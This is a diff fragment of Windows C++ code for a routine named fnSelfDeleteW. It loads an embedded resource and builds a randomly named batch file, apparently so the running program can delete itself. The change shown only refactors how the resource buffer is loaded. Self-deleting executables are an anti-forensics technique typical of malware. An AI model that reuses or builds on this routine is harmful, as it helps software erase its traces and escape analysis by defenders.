@@ -5,12 +5,12 @@ BOOL fnSelfDeleteW(
 	_In_ WCHAR szCd[],
 	_In_ WCHAR szMfn[]
 ) {
-	LPVOID lpBuffer = NULL;
-	DWORD dwBufferSize =  NULL;
+	DWORD dwBufferSize = NULL;
 	HANDLE hHeap = GetProcessHeap();
 	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";
 
-	if (fnLoadResourceW(IDR_RCDATA_0x01, lpBuffer, &dwBufferSize)) {
+	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA_0x01, &dwBufferSize);
+	if (lpBuffer) {
 		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
 		if (pszDest) {
 			SIZE_T ulHeap = HeapSize(hHeap, NULL, pszDest);
